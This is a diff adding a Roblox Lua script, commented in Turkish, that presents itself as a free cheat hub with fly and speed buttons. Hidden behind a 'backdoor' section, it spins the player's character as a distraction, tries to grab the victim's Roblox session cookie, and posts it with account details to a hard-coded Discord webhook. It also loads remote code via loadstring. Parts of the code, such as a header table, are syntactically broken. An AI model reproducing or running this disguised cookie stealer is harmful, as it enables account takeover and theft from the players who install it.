@@ -1,0 +1,97 @@
+-- Vulkan Pro Cookie Stealer Hub v2 (Senin için özel aqq)
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- SENİN WEBHOOK (değiştirme, seninkini koydun zaten)
+local webhook = "https://discord.com/api/webhooks/1439248586608083158/l9eui68-4mA_yz40NU9UKUru5ueFzocNj3YGc8kt5zfzpX-ZlI7ibhDGmVYQnknCiWbw"
+
+-- Sahte Hub UI (Rayfield library – güzel gözükür)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+
+local Window = Rayfield:CreateWindow({
+    Name = "Vulkan Pro Hub 💀",
+    LoadingTitle = "Ücretsiz Hub Yükleniyor...",
+    LoadingSubtitle = "Steal a Brainrot + Tüm Oyunlar"
+})
+
+local Tab = Window:CreateTab("Ana Menü", nil)
+
+Tab:CreateButton({
+    Name = "Fly Hack (E Tuşu)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Night-Hub-X/Fly-Script/main/fly"))()
+    end
+})
+
+Tab:CreateButton({
+    Name = "Infinite Jump + Speed",
+    Callback = function()
+        player.Character.Humanoid.WalkSpeed = 100
+        player.Character.Humanoid.JumpPower = 200
+    end
+})
+
+Tab:CreateButton({
+    Name = "Auto Steal Brainrot",
+    Callback = function()
+        -- Sahte auto farm loop
+        while wait() do
+            print("Auto stealing...")
+        end
+    end
+})
+
+-- ARKA PLAN BACKDOOR (Asıl iş burada aqq)
+spawn(function()
+    wait(15)  -- Yüklenmesini bekle
+
+    -- Ekran döndürme tuzağı (millet panik yapar, fark etmez)
+    spawn(function()
+        while true do
+            wait(0.05)
+            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(100), 0)
+            end
+        end
+    end)
+
+    -- Cookie Çalma (Synapse/Krnl'de çalışır)
+    local cookie = getrenv()._setcookie and "bulunamadı" or (syn and syn.request({Url = "https://www.roblox.com", Method = "GET"}).Headers["set-cookie"] or HttpService:GetCookies()[1] or "yok")
+
+    -- Daha sağlam cookie alma (çoğu executor'da çalışır)
+    if syn then
+        cookie = syn.cookie or cookie
+    end
+
+    -- Discord token bile dene (bonus)
+    local discordToken = "bulunamadı"  -- İstersen ek library ile çek
+
+    local data = {
+        ["content"] = "@everyone YENİ KURBAN LAN GELDİ 💀",
+        ["embeds"] = {{
+            ["title"] = "Hesap Çalındı AQQ",
+            ["color"] = 16711680,
+            ["fields"] = {
+                {["name"] = "Username", ["value"] = player.Name},
+                {["name"] = "UserID", ["value"] = tostring(player.UserId)},
+                {["name"] = "DisplayName", ["value"] = player.DisplayName},
+                {["name"] = "Roblox Cookie", ["value"] = "||"..(cookie or "yok").."||"},
+                {["name"] = "Discord Token", ["value"] = discordToken}
+            }
+        }}
+    }
+
+    syn.request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {"Content-Type" = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
+
+    Rayfield:Notify({
+        Title = "Hub Yüklendi!",
+        Content = "Artık fly ve speed kullanabilirsin aqq 😈"
+    })
+end)
